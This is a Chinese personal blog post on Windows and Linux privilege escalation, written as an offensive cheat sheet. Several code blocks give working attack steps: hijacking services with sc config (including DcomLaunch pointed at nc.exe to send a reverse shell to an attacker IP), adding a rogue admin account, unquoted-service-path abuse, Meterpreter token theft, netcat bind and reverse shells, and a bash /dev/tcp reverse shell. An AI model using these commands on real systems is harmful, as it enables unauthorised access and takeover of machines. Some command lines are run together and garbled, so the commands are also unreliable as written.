<!DOCTYPE html>
<html lang="zh-Hans">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="future.zhangyan">



    <meta name="description" content="未来可期">



<title>提权 | Hexo</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    




	<!--动态线条背景-->

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
    <div class="wrapper">
        <header>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>

    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
				<label for="switch_default" class="toggleBtn"></label>
         
				<div class="search bar7">
					<form id="search-form"> <!-- 搜索框相关 -->
						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
						<button type="submit" class="search-form-submit"></button>
						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
					</form>
					<div class="ins-section-wrapper">
						<div class="ins-section-container"></div>
					</div>
					<div id="local-search-result"></div> <!-- 搜索结果区 -->
						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
					</div>


        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
            </div>


        </div>
    </nav>

</header>
<style type="text/css">
	* {
		box-sizing:border-box;
	}
	body {
		margin:0;
		padding:0;
		background-image:url(ydrzimages/p3.jpg);
		font-weight:500;
		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
	}
	#container {
		width:500px;
		height:820px;
		margin:0 auto;
	}
	div.search {
		padding:10px 0;
		margin-left:200px
	}
	form {
		position:relative;
		width:300px;
		margin:0 auto;
	}
	input,button {
		border:none;
		outline:none;
	}
	input {
		width:100%;
		height:42px;
		padding-left:13px;
	}
	button {
		height:42px;
		width:42px;
		cursor:pointer;
		position:absolute;
	}
	/*搜索框7*/
		  
	.bar7 form {
		height:42px;
	}
	.bar7 input {
		width:200px;
		border-radius:42px;
		border:2px solid #324B4E;
		transition:.3s linear;
		float:right;
	}
	.bar7 input:focus {
		width:300px;
	}
	.bar7 button {
		background:none;
		top:-2px;
		right:20px;
	}
	.bar7 button:before {
		content:"点..";
		font-family:FontAwesome;
		color:#324b4e;
	}
	.no-result{
		display:none
	}
</style>

<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">提权</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">September 19, 2019&nbsp;&nbsp;20:15:53</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
                            
                        </span>
						<span id="/2019/09/19/%E6%8F%90%E6%9D%83/" class="leancloud-visitors view" data-flag-title="提权">
						  <em class="post-meta-item-text">Pageviews:</em>
						  <i class="leancloud-visitors-count"></i>
						</span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%8F%90%E6%9D%83.png"></p>
<h1 id="window"><a href="#window" class="headerlink" title="window"></a>window</h1><h2 id="一、常见提权方法"><a href="#一、常见提权方法" class="headerlink" title="一、常见提权方法"></a>一、常见提权方法</h2><p>1、溢出漏洞提权</p>
<p>2、数据库提权</p>
<p>3、第三方软件提权</p>
<h2 id="二、Cmd命令无法执行原因分析"><a href="#二、Cmd命令无法执行原因分析" class="headerlink" title="二、Cmd命令无法执行原因分析"></a>二、Cmd命令无法执行原因分析</h2><h3 id="1、Cmd命令无法执行分析"><a href="#1、Cmd命令无法执行分析" class="headerlink" title="1、Cmd命令无法执行分析"></a>1、Cmd命令无法执行分析</h3><p>主要原因是cmd.exe被管理员降权或删除，也有可能组件被删除。</p>
<h3 id="2、Cmd命令执行解决方法"><a href="#2、Cmd命令执行解决方法" class="headerlink" title="2、Cmd命令执行解决方法"></a>2、Cmd命令执行解决方法</h3><p>通过脚本木马查找可读可写目录，上传cmd，调用cmd路径执行命令（找可读可写目录不要选带空格目录）。</p>
<p>setp c:\路径…\cmd.exe #切换至上传的cmd来执行命令</p>
<h2 id="三、提权常用命令讲解"><a href="#三、提权常用命令讲解" class="headerlink" title="三、提权常用命令讲解"></a>三、提权常用命令讲解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">whoami ——查看用户权限</span><br><span class="line">systeminfo ——查看操作系统，补丁情况</span><br><span class="line">ipconfig——查看当前服务器</span><br><span class="line">IPipconfig&#x2F;allnet user——查看当前用户情况</span><br><span class="line">netstat ——查看当前网络连接情况  </span><br><span class="line">netstat –ano&#x2F;netstat –an|find“ESTABLISHED”tasklist ——查看当前进程情况 </span><br><span class="line">tasklist&#x2F;svctaskkill ——结束进程 </span><br><span class="line">taskkill-PIDxxnet start  ——启动服务net stop ——停止服务</span><br></pre></td></tr></table></figure>

<p><strong>⚪微软官方时刻关注列表网址:</strong><br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017</a></p>
<p>比如常用的几个已公布的 exp：KB2592799KB3000061KB2592799</p>
<p><strong>🔴快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;micropoor.txt&amp;(for%iin(KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780)do@typemicropoor.txt|@find&#x2F;i&quot;%i&quot;||@echo%i you can fuck)&amp;del&#x2F;f&#x2F;q&#x2F;a micropoor.txt</span><br></pre></td></tr></table></figure>

<p><strong>⛔一般实战中在类似 tmp 目录等可写目录下执行：如 C:\tmp&gt;</strong></p>
<p><strong>⚫目前已对外公开exp注：</strong></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a></p>
<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/AusJock/Privilege-Escalation">https://github.com/AusJock/Privilege-Escalation</a></p>
</blockquote>
<h2 id="四、溢出漏洞提权实战测试"><a href="#四、溢出漏洞提权实战测试" class="headerlink" title="四、溢出漏洞提权实战测试"></a>四、溢出漏洞提权实战测试</h2><h3 id="UAC介绍"><a href="#UAC介绍" class="headerlink" title="UAC介绍"></a>UAC介绍</h3><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。<br>当前获得的权限是存在于管理员组的时候但是并且是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac</p>
<h3 id="windows-7、8、08、12、16"><a href="#windows-7、8、08、12、16" class="headerlink" title="windows 7、8、08、12、16"></a><strong>windows 7、8、08、12、16</strong></h3><p><strong>sc</strong>  <strong>命令提权（administrator–&gt;system）</strong></p>
<p>ps：经测试03也可以。</p>
<p>关于sc命令：</p>
<p>SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure>

<p>这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务然后执行<br>sc start systcmd，就得到了一个system权限的cmd环境</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/2.jpg"></p>
<p><strong>不带引号的服务路径</strong></p>
<meta charset="utf-8">

<p>Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞，如下述路径，C:\Program Files\Vulnerable.exe中存在空格，此时在C盘根目录上传Program.exe文件时，就会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Vulnerable.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub.exe</span><br><span class="line">C:\Program Files\Vulnerable Service\Sub Directory\service.exe</span><br></pre></td></tr></table></figure>

<p><strong>我们可以使用以下命令查看错误配置的路径</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="4-4、利用不安全的服务权限"><a href="#4-4、利用不安全的服务权限" class="headerlink" title="4.4、利用不安全的服务权限"></a>4.4、利用不安全的服务权限</h4><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。<br><strong>AccessChk工具可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv “Authenticated Users” * &#x2F;accepteula</span><br><span class="line">accesschk.exe -uwcqv “user” *</span><br></pre></td></tr></table></figure>

<p><strong>sc命令也可以用来查找用户可以修改的服务：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc “Service”   #查找可以修改的服务</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc config PFNET binpath&#x3D; “net user rottenadmin P@ssword123! &#x2F;add”</span><br><span class="line">sc stop PFNET</span><br><span class="line">sc start PFNET</span><br></pre></td></tr></table></figure>

<p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell</p>
<h5 id="完整案例："><a href="#完整案例：" class="headerlink" title="完整案例："></a>完整案例：</h5><p><strong>①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“sc qc DcomLaunch”命令查询DcomLaunch的详细信息</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start | find &quot;DCOM Server Process Launcher&quot;  查看服务是否启动</span><br></pre></td></tr></table></figure>

<p>运行 tasklist /svc 找到对应服务</p>
<p><strong>②、修改服务并获取系统权限</strong></p>
<p>这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config DcomLaunch binpath&#x3D; &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e  C:\WINDOWS\system32\cmd.exe&quot;  </span><br></pre></td></tr></table></figure>

<p>⛔注意binpath=后面一定要有个空格，IP为攻击者IP</p>
<p><strong>③、查看是否第二步成功</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>④、配置账号密码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config DcomLaunch obj&#x3D; &quot;.\LocalSystem&quot;  password&#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>obj:指定运行服务将使用的帐户名，或指定运行驱动程序将使用的 Windows 驱动程序对象名。默认设置为 LocalSystem。<br>password:指定一个密码。如果使用了非 LocalSystem 的帐户，则此项是必需的。</p>
<p><strong>⑤、重启服务</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start DcomLaunch </span><br></pre></td></tr></table></figure>

<p><strong>⑥、攻击机上用nc进行监听4433即可得到反弹的shell</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -vv -l -p 4433</span><br></pre></td></tr></table></figure>

<h4 id="4-5、计划任务"><a href="#4-5、计划任务" class="headerlink" title="4.5、计划任务"></a>4.5、计划任务</h4><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v    #查看计算机的计划任务</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula   #查看指定目录的权限配置情况</span><br></pre></td></tr></table></figure>

<h4 id="4-6、Meterpreter基础提权"><a href="#4-6、Meterpreter基础提权" class="headerlink" title="4.6、Meterpreter基础提权"></a>4.6、Meterpreter基础提权</h4><p>首先在Meterpreter会话执行ps命令查看目标机当前进程：<br>假设此处看到了一个进程，运行账户是域管理员，我们可以再第一栏找到对应的进程PID，（实际我们这里找个任意的SYSTEM账户运行的进程），PID为2584：<br>然后我们可以执行以下语句窃取该用户进程的令牌：linux</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token  2584</span><br></pre></td></tr></table></figure>

<h2 id="五、溢出漏洞安全防范"><a href="#五、溢出漏洞安全防范" class="headerlink" title="五、溢出漏洞安全防范"></a>五、溢出漏洞安全防范</h2><hr>
<p><strong>🟣及时通过Windows Update或第三方工具360更新补丁</strong><br>在dos命令窗口输入systeminfo 命令回车，显示所有系统补丁相关信息</p>
<p><img src="/image/%E6%8F%90%E6%9D%83/1.jpg"></p>
<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>当我们拿到了一台Linux服务器的低权限账号，于是，我们想要通过技术手段提权至 root 用户权限，以执行更多的操作。首先关于Linux提权我们得先明白几个概念。</p>
<h2 id="壹：linux发行版本"><a href="#壹：linux发行版本" class="headerlink" title="壹：linux发行版本"></a>壹：linux发行版本</h2><hr>
<p>是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CentOS    社区企业版（服务器端）</span><br><span class="line">redhat    社区个人版</span><br><span class="line">ubuntu   （个人端）</span><br><span class="line">kali     （hacked）</span><br></pre></td></tr></table></figure>

<h2 id="贰：linux内核"><a href="#贰：linux内核" class="headerlink" title="贰：linux内核"></a>贰：linux内核</h2><hr>
<p>Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文件系统控制及多任务功能的系统核心程序。<br><strong>Linux内核版本有两种：</strong>稳定版和开发版 ，Linux内核版本号由3组数字组成：第一个组数字.第二组数字.第三组数字</p>
<blockquote>
<p>第一个组数字：目前发布的内核主版本。<br>第二个组数字：偶数表示稳定版本；奇数表示开发中版本。<br>第三个组数字：错误修补的次数。</p>
</blockquote>
<p>使用 uname -r 可以看到linux系统的发行版本号。3.10.0就是内核版本号。3就是内核主版本，10表示是稳定版，0表示错误修补次数是0。 而 123.el7.x86_64则是 redhat 的发行版本信息，123 代表编译123次，el7代表的是redhat7，x86_64则是64位系统。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">或者使用以下命令也可以看到系统内核及版本的一些信息：</span><br><span class="line">uname -a                 #查看内核的具体信息</span><br><span class="line">cat &#x2F;proc&#x2F;version        #查看内核的具体信息</span><br><span class="line">cat &#x2F;etc&#x2F;centos-release  #查看centos发行版本</span><br><span class="line">cat &#x2F;etc&#x2F;redhat-release  #查看redhat发行版本</span><br></pre></td></tr></table></figure>

<h2 id="叁：Linux开启apache服务"><a href="#叁：Linux开启apache服务" class="headerlink" title="叁：Linux开启apache服务"></a>叁：Linux开启apache服务</h2><hr>
<p>在终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“vim &#x2F;etc&#x2F;apache2&#x2F;ports.conf” -&gt; </span><br></pre></td></tr></table></figure>

<p>键盘输入i 进入插入编辑模式 -&gt; 修改apache2默认监听端口号为8080 -&gt; 编辑好后，按Esc键+“：wq” 保存退出 -&gt; 在终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“&#x2F;etc&#x2F;init.d&#x2F;apache2 start”</span><br></pre></td></tr></table></figure>

<h2 id="肆：Linux提权的前提："><a href="#肆：Linux提权的前提：" class="headerlink" title="肆：Linux提权的前提："></a>肆：Linux提权的前提：</h2><hr>
<blockquote>
<p>拿到了一个低权限的账号<br>能上传和下载文件<br>机器上有python、java、perl等环境（非必须项）</p>
</blockquote>
<h2 id="伍：Linux常用渗透命令学习"><a href="#伍：Linux常用渗透命令学习" class="headerlink" title="伍：Linux常用渗透命令学习"></a>伍：Linux常用渗透命令学习</h2><hr>
<blockquote>
<p>死记硬背以下12类命令：系统信息查看类、文件目录类、驱动挂载类、程序安装类、源代码包安装、压缩解压类、进程控制类、程序运行类、用户帐号类、vi编辑类、网络服务、其他类等。</p>
<p>详情参考：Linux常用渗透命令篇</p>
</blockquote>
<h2 id="陆：Linux提权方法总结"><a href="#陆：Linux提权方法总结" class="headerlink" title="陆：Linux提权方法总结"></a>陆：Linux提权方法总结</h2><h4 id="一、Linux反弹提权"><a href="#一、Linux反弹提权" class="headerlink" title="一、Linux反弹提权"></a>一、Linux反弹提权</h4><p><strong>如果手里只有webshell可以利用反弹shell来得到一个shell</strong></p>
<h5 id="1、首先得有一个netcat"><a href="#1、首先得有一个netcat" class="headerlink" title="1、首先得有一个netcat"></a>1、首先得有一个netcat</h5><p><strong>🟩简单介绍一下netcat</strong></p>
<blockquote>
<p>功能强大的网络工具，在网络工具中有“瑞士军刀”美誉，其有Windows和Linux的版本。因为它短小精悍,功能实用，被设计为一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。<br><strong>详情参考：</strong><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/nmap/p/6148306.html">https://www.cnblogs.com/nmap/p/6148306.html</a></p>
</blockquote>
<p><strong>①netcat参数介绍</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) -l            用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。</span><br><span class="line">2) -p &lt;port&gt;     暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）</span><br><span class="line">3) -s            指定发送数据的源IP地址，适用于多网卡机</span><br><span class="line">4) -u             指定nc使用UDP协议，默认为TCP</span><br><span class="line">5) -v            输出交互或出错信息，新手调试时尤为有用</span><br><span class="line">6）-w            超时秒数，后面跟数字</span><br><span class="line">7）-z            表示zero，表示扫描时不发送任何数据</span><br></pre></td></tr></table></figure>

<p><strong>②nc用法介绍 1——tcp监听</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc nc -l -p 8080      开启本地8080端口监听</span><br></pre></td></tr></table></figure>

<p><strong>③nc用法介绍 2——反弹服务器shell</strong></p>
<p><strong>方法⑴：</strong>REMOTE主机绑定SHELL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在公网监听</span><br><span class="line">nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</span><br><span class="line">或者</span><br><span class="line">nc -l -p 5555 -t -e cmd.exe</span><br><span class="line">在内网主动建立连接</span><br><span class="line">nc -nvv 192.168.153.138 5555</span><br></pre></td></tr></table></figure>

<p><strong>讲解：</strong>-t是通过telne模式执行 cmd.exe 程序，可以省略。<br>绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口</p>
<p><strong>方法⑵：</strong>REMOTE主机绑定SHELL并反向连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在公网监听</span><br><span class="line">nc -lp 5555</span><br><span class="line">在内网机器反弹</span><br><span class="line">nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</span><br><span class="line">或者</span><br><span class="line">nc -t -e cmd 192.168.153.140 5555</span><br></pre></td></tr></table></figure>

<p><strong>讲解：</strong>绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口<br>以上为最基本的几种用法（其实NC的用法还有很多，当配合管道命令”|”与重定向命令”&lt;”、”&gt;”等等命令功能更强大……）</p>
<h5 id="2、利用bash直接反弹"><a href="#2、利用bash直接反弹" class="headerlink" title="2、利用bash直接反弹"></a>2、利用bash直接反弹</h5><p><strong>🟪简单介绍一下bash</strong></p>
<blockquote>
<p>Bash，Unix shell的一种，在1987年由布莱恩·福克斯为了GNU计划而编写。1989年发布第一个正式版本，原先是计划用在GNU操作系统上，但能运行于大多数类Unix系统的操作系统之上，包括Linux与Mac OS X v10.4都将它作为默认shell。它支持文件名替换（通配符匹配）、管道、here文档、命令替换、变量，以及条件判断和循环遍历的结构控制语句。</p>
</blockquote>
<p><strong>（1） bash反弹一句话</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.本地 nc -l -p 8080</span><br></pre></td></tr></table></figure>

<p><strong>（2）bash一句话命令详解</strong><br>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 命令                                命令详解</span><br><span class="line">bash -i                          产生一个bash交互环境</span><br><span class="line">&gt;&amp;                               将联合符号前面的内容与后面的相结合然后一起重定向给后者</span><br><span class="line">&#x2F;dev&#x2F;tcp&#x2F;192.168.31.41&#x2F;8080      linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让主机与目标主机192.168.61.41:8080端口建立一个TCP连接。</span><br><span class="line">0&gt;&amp;1                             将标准的输入与标准输出内容相结合，然后重定向给前面标准的输出内容。</span><br></pre></td></tr></table></figure>

<p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h4 id="二、脏牛内核提权"><a href="#二、脏牛内核提权" class="headerlink" title="二、脏牛内核提权"></a>二、脏牛内核提权</h4><p><strong>脏牛漏洞：</strong>又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。还有一些其他的内核漏洞提权了。但是内核漏洞提权很难成功，因为内核提权对内核的版本，还有目标机器的环境要求很高(需要安装有gcc等编译环境 )。所以使用内核提权成功率很低。并且内核提权需要查看exp的源代码，不然可能连编译都不会。</p>
<p><strong>漏洞范围：</strong>Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p>
<p><strong>简要分析：</strong>该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p>
